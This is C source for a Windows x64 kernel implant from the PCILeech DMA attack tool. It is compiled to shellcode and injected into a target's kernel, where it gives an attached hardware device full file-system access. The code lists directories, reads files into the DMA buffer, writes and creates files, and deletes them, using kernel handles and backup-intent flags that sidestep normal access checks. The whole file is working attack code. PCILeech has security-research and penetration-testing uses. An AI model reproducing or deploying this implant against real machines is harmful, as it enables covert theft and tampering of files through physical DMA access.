// wx64_vfs.c : kernel code to support the PCILeech file system.
// Compatible with Windows x64.
//
// (c) Ulf Frisk, 2017
// Author: Ulf Frisk, pcileech@frizk.net
//
// compile with:
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel wx64_common.c
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel wx64_vfs.c
// ml64 wx64_common_a.asm /Fewx64_vfs.exe /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main wx64_vfs.obj wx64_common.obj
// shellcode64.exe -o wx64_vfs.exe
// 
#include "wx64_common.h"

//-----------------------------------------------------------------------------
// Core defines and typedefs shared between kernel implants and pcileech.
//-----------------------------------------------------------------------------

#define VFS_OP_MAGIC				0x79e720ad93aa130f
#define VFS_OP_CMD_LIST_DIRECTORY	1
#define VFS_OP_CMD_WRITE			2
#define VFS_OP_CMD_READ				3
#define VFS_OP_CMD_CREATE			4
#define VFS_OP_CMD_DELETE			5

#define VFS_FLAGS_FILE_NORMAL		0x01
#define VFS_FLAGS_FILE_DIRECTORY	0x02
#define VFS_FLAGS_FILE_SYMLINK		0x04
#define VFS_FLAGS_FILE_OTHER		0x08
#define VFS_FLAGS_UNICODE			0x10
#define VFS_FLAGS_EXIST_FILE		0x20
#define VFS_FLAGS_TRUNCATE_ON_WRITE	0x40
#define VFS_FLAGS_APPEND_ON_WRITE	0x80

typedef struct tdVFS_OPERATION {
	QWORD magic;
	QWORD op;
	QWORD flags;
	CHAR szFileName[MAX_PATH];
	WCHAR wszFileName[MAX_PATH];
	QWORD offset;
	QWORD cb;
	BYTE pb[];
} VFS_OPERATION, *PVFS_OPERATION;

typedef struct tdVFS_RESULT_FILEINFO {
	QWORD flags;
	QWORD tAccessOpt;
	QWORD tModifyOpt;
	QWORD tCreateOpt;
	QWORD dbg1;
	QWORD dbg2;
	QWORD cb;
	WCHAR wszFileName[MAX_PATH];
} VFS_RESULT_FILEINFO, *PVFS_RESULT_FILEINFO;

//-----------------------------------------------------------------------------
// Other required defines and typedefs.
//-----------------------------------------------------------------------------

typedef struct _FILE_BOTH_DIR_INFORMATION {
	ULONG	NextEntryOffset;
	ULONG	FileIndex;
	QWORD	CreationTime;
	QWORD	LastAccessTime;
	QWORD	LastWriteTime;
	QWORD	ChangeTime;
	QWORD	EndOfFile;
	QWORD	AllocationSize;
	ULONG	FileAttributes;
	ULONG	FileNameLength;
	ULONG	EaSize;
	CCHAR	ShortNameLength;
	WCHAR	ShortName[12];
	WCHAR	FileName[1];
} FILE_BOTH_DIR_INFORMATION, *PFILE_BOTH_DIR_INFORMATION;

#define STATUS_UNSUCCESSFUL						0xC0000001
#define OBJ_CASE_INSENSITIVE    				0x00000040
#define FILE_SYNCHRONOUS_IO_NONALERT			0x00000020
#define FILE_OPEN								0x00000001
#define FILE_OVERWRITE_IF						0x00000005
#define OBJ_KERNEL_HANDLE       				0x00000200

//-----------------------------------------------------------------------------
// Functions below.
//-----------------------------------------------------------------------------

NTSTATUS VfsWrite(_In_ PKMDDATA pk, _In_ PKERNEL_FUNCTIONS fnk, _In_ PVFS_OPERATION pop)
{
	UNREFERENCED_PARAMETER(pk);
	NTSTATUS nt;
	HANDLE hFile = 0;
	IO_STATUS_BLOCK _io;
	OBJECT_ATTRIBUTES _oa;
	UNICODE_STRING _su;
	ULONG CreateDisposition;
	ACCESS_MASK DesiredAccess;
	fnk->RtlZeroMemory(&_oa, sizeof(OBJECT_ATTRIBUTES));
	fnk->RtlZeroMemory(&_io, sizeof(IO_STATUS_BLOCK));
	fnk->RtlInitUnicodeString(&_su, pop->wszFileName);
	InitializeObjectAttributes(&_oa, &_su, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
	DesiredAccess = (pop->flags & VFS_FLAGS_APPEND_ON_WRITE) ? FILE_APPEND_DATA : GENERIC_WRITE;
	CreateDisposition = ((pop->flags & VFS_FLAGS_TRUNCATE_ON_WRITE) && (0 == pop->offset)) ? FILE_OVERWRITE_IF : FILE_OPEN;
	nt = fnk->ZwCreateFile(&hFile, DesiredAccess, &_oa, &_io, NULL, FILE_ATTRIBUTE_NORMAL, 0, CreateDisposition, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
	if(nt) { goto cleanup; }
	nt = fnk->ZwWriteFile(hFile, NULL, NULL, NULL, &_io, pop->pb, (DWORD)pop->cb, (PLARGE_INTEGER)&pop->offset, 0);
cleanup:
	if(hFile) { fnk->ZwClose(hFile); }
	return nt;
}

NTSTATUS VfsRead(_In_ PKMDDATA pk, _In_ PKERNEL_FUNCTIONS fnk, _In_ PVFS_OPERATION pop)
{
	NTSTATUS nt;
	HANDLE hFile = 0;
	IO_STATUS_BLOCK _io;
	OBJECT_ATTRIBUTES _oa;
	UNICODE_STRING _su;
	fnk->RtlZeroMemory(&_oa, sizeof(OBJECT_ATTRIBUTES));
	fnk->RtlZeroMemory(&_io, sizeof(IO_STATUS_BLOCK));
	fnk->RtlInitUnicodeString(&_su, pop->wszFileName);
	InitializeObjectAttributes(&_oa, &_su, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
	nt = fnk->ZwCreateFile(&hFile, GENERIC_READ, &_oa, &_io, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_OPEN, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
	if(nt) { goto cleanup; }
	nt = fnk->ZwReadFile(hFile, NULL, NULL, NULL, &_io, (PVOID)(pk->DMAAddrVirtual + pk->dataOutExtraOffset), (ULONG)pop->cb, &pop->offset, 0);
	if(nt) { goto cleanup; }
	pk->dataOutExtraLength = (QWORD)_io.Information;
cleanup:
	if(hFile) { fnk->ZwClose(hFile); }
	return nt;
}

NTSTATUS VfsList(_In_ PKMDDATA pk, _In_ PKERNEL_FUNCTIONS fnk, _In_ PVFS_OPERATION pop)
{
	NTSTATUS nt = 0;
	HANDLE hFileFind = 0;
	UNICODE_STRING _su;
	IO_STATUS_BLOCK _io;
	OBJECT_ATTRIBUTES _oa;
	PVFS_RESULT_FILEINFO pfi;
	PFILE_BOTH_DIR_INFORMATION pdi;
	QWORD cfi = 0, cfiMax;
	BOOLEAN isRestartScan = TRUE;
	if(pk->dataOutExtraLengthMax < 0x00200000) { return STATUS_FAIL_OUTOFMEMORY; }
	pfi = (PVFS_RESULT_FILEINFO)(pk->DMAAddrVirtual + pk->dataOutExtraOffset);
	cfiMax = (pk->dataOutExtraLengthMax - 0x00100000) / sizeof(VFS_RESULT_FILEINFO);
	fnk->RtlZeroMemory(&_io, sizeof(IO_STATUS_BLOCK));
	fnk->RtlZeroMemory(&_oa, sizeof(OBJECT_ATTRIBUTES));
	fnk->RtlInitUnicodeString(&_su, pop->wszFileName);
	InitializeObjectAttributes(&_oa, &_su, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
	nt = fnk->ZwOpenFile(&hFileFind, FILE_LIST_DIRECTORY | SYNCHRONIZE, &_oa, &_io, FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_SYNCHRONOUS_IO_NONALERT | 1 /*FILE_DIRECTORY_FILE*/ | 0x4000 /*FILE_OPEN_FOR_BACKUP_INTENT*/);
	if(nt) { goto cleanup; }
	while(TRUE) {
		pdi = (PFILE_BOTH_DIR_INFORMATION)(pk->DMAAddrVirtual + pk->dataOutExtraOffset + pk->dataOutExtraLengthMax - 0x00100000);
		nt = fnk->ZwQueryDirectoryFile(hFileFind, NULL, NULL, NULL, &_io, pdi, 0x00100000, 3 /*FileBothDirectoryInformation*/, FALSE, NULL, isRestartScan);
		isRestartScan = FALSE;
		if(nt || (0 == _io.Information)) { goto cleanup; }
		while(TRUE) {
			fnk->RtlZeroMemory(pfi, sizeof(VFS_RESULT_FILEINFO));
			pfi->cb = pdi->EndOfFile;
			pfi->tAccessOpt = pdi->LastAccessTime;
			pfi->tCreateOpt = pdi->CreationTime;
			pfi->tModifyOpt = pdi->ChangeTime;
			pfi->flags |= VFS_FLAGS_UNICODE;
			pfi->flags |= (pdi->FileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? VFS_FLAGS_FILE_DIRECTORY : VFS_FLAGS_FILE_NORMAL;
			fnk->RtlCopyMemory(pfi->wszFileName, pdi->FileName, min(MAX_PATH - 1, pdi->FileNameLength));
			pfi++;
			cfi++;
			if(cfi >= cfiMax) { goto cleanup; }
			if(0 == pdi->NextEntryOffset) { break; }
			pdi = (PFILE_BOTH_DIR_INFORMATION)((QWORD)pdi + pdi->NextEntryOffset);
		}
	}
cleanup:
	pk->dataOutExtraLength = cfi * sizeof(VFS_RESULT_FILEINFO);
	if(hFileFind) { fnk->ZwClose(hFileFind); }
	return cfi ? 0 : nt;
}

NTSTATUS VfsCreate(_In_ PKMDDATA pk, _In_ PKERNEL_FUNCTIONS fnk, _In_ PVFS_OPERATION pop)
{
	UNREFERENCED_PARAMETER(pk);
	NTSTATUS nt = 0;
	HANDLE hFile = 0;
	UNICODE_STRING _su;
	IO_STATUS_BLOCK _io;
	OBJECT_ATTRIBUTES _oa;
	fnk->RtlZeroMemory(&_io, sizeof(IO_STATUS_BLOCK));
	fnk->RtlZeroMemory(&_oa, sizeof(OBJECT_ATTRIBUTES));
	fnk->RtlInitUnicodeString(&_su, pop->wszFileName);
	InitializeObjectAttributes(&_oa, &_su, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
	nt = fnk->ZwCreateFile(&hFile, GENERIC_READ, &_oa, &_io, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ | FILE_SHARE_WRITE, 3/*FILE_OPEN_IF*/, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
	if(hFile) { fnk->ZwClose(hFile); }
	return nt;
}

NTSTATUS VfsDelete(_In_ PKMDDATA pk, _In_ PKERNEL_FUNCTIONS fnk, _In_ PVFS_OPERATION pop)
{
	UNREFERENCED_PARAMETER(pk);
	NTSTATUS nt = 0;
	HANDLE hFile = 0;
	UNICODE_STRING _su;
	IO_STATUS_BLOCK _io;
	OBJECT_ATTRIBUTES _oa;
	fnk->RtlZeroMemory(&_io, sizeof(IO_STATUS_BLOCK));
	fnk->RtlZeroMemory(&_oa, sizeof(OBJECT_ATTRIBUTES));
	fnk->RtlInitUnicodeString(&_su, pop->wszFileName);
	InitializeObjectAttributes(&_oa, &_su, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
	nt = fnk->ZwCreateFile(&hFile, GENERIC_WRITE, &_oa, &_io, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_DELETE, FILE_OPEN, 0x00001000/*FILE_DELETE_ON_CLOSE*/, NULL, 0);
	if(hFile) { fnk->ZwClose(hFile); }
	return nt;
}

VOID c_EntryPoint(_In_ PKMDDATA pk)
{
	KERNEL_FUNCTIONS ofnk;
	PKERNEL_FUNCTIONS fnk;
	PVFS_OPERATION pop;
	// initialize kernel functions and strings
	InitializeKernelFunctions(pk->AddrKernelBase, &ofnk);
	fnk = &ofnk;
	// setup references to in/out data and check validity
	pop = (PVFS_OPERATION)(pk->DMAAddrVirtual + pk->dataInExtraOffset);
	if((pk->dataInExtraLength < sizeof(VFS_OPERATION)) || (pop->magic != VFS_OP_MAGIC)) {
		pk->dataOut[0] = (QWORD)STATUS_UNSUCCESSFUL;
		return;
	}
	// take action
	if(pop->op == VFS_OP_CMD_LIST_DIRECTORY) {
		pk->dataOut[0] = VfsList(pk, fnk, pop);
		return;
	}
	if(pop->op == VFS_OP_CMD_READ) {
		pk->dataOut[0] = VfsRead(pk, fnk, pop);
		return;
	}
	if(pop->op == VFS_OP_CMD_WRITE) {
		pk->dataOut[0] = VfsWrite(pk, fnk, pop);
		return;
	}
	if(pop->op == VFS_OP_CMD_CREATE) {
		pk->dataOut[0] = VfsCreate(pk, fnk, pop);
		return;
	}
	if(pop->op == VFS_OP_CMD_DELETE) {
		pk->dataOut[0] = VfsDelete(pk, fnk, pop);
		return;
	}
}
